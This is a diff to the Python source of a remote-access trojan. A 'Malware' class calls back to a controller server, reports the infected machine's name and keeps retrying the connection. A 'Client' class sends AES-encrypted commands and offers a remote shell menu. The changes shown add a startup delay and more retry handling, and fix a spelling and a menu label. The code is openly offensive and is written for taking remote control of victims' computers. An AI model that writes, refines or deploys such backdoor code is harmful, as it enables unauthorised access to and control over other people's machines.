@@ -33,13 +33,15 @@ class Malware(Machine):
         super().__init__()
 
     def start(self):
+        time.sleep(2)
         try:
             print("try to co ....")
             self.my_socket.connect(self.server_addr)
             self.send(os.environ["COMPUTERNAME"])
             time.sleep(1)
         except socket.error:
-            time.sleep(3)
+            self.start()
+        except TimeoutError:
             self.start()
 
     def send(self, message):
@@ -94,9 +96,9 @@ class Client(Machine):
         hostname = self.receive()
         print("The malware has infected the machine named " + str(hostname) + "\n")
 
-    def send(self, commande):
+    def send(self, command):
         try:
-            send_b = commande.encode(self.language)
+            send_b = command.encode(self.language)
             iv = get_random_bytes(16)
             cipher = AES.new(self.key, AES.MODE_CFB, iv)
             encrypted = b64encode(iv + cipher.encrypt(send_b))
@@ -137,7 +139,7 @@ class Client(Machine):
               "    \\/    \\/\\__,_|_|_| |_| \\/    \\/\\___|_| |_|\\__,_|\n",
               "                                                    \n")
         print("Press 1 to access the remote shell (if you enter the shell you won't be able to chose another option)")
-        print("Press 2 to get informations")
+        print("Press 2 to get informations (For windows target only)")
         print("Press 0 to quit")
         choice = input()
         return choice
